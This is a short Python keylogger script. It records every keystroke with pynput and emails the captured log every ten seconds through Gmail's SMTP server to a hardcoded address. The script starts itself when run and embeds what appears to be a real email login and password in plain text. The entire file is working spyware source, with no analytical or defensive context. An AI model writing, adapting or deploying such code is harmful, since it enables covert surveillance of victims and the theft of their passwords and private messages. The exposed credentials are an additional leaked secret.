import smtplib
import threading
from pynput import keyboard


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    # Create underlying back structure which will publish emails

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # Create Report & Send Email

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # Start KeyLogger and Send Off Emails

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


keylogger = KeyLogger(10, 'aydinnyunus@gmail.com', '399279216yunus')
keylogger.run()

